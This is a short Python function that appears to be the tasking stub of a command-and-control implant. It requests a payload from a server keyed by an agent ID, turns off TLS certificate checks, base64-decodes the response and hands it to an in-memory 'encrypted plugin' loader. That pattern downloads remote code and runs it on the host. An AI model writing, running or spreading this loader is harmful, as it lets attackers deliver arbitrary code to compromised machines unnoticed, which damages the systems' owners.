
import requests, base64
from memory_loader import load_encrypted_plugin

def fetch_and_run_plugin(agent_id, server_url):
    try:
        url = f"{server_url}/task/{agent_id}"
        r = requests.get(url, timeout=10, verify=False)
        if r.status_code == 200:
            payload = r.json().get("payload")
            if payload:
                plugin_blob = base64.b64decode(payload.encode())
                load_encrypted_plugin(plugin_blob, agent_id)
                return True
        return False
    except Exception as e:
        print(f"[!] Plugin fetch failed: {e}")
        return False
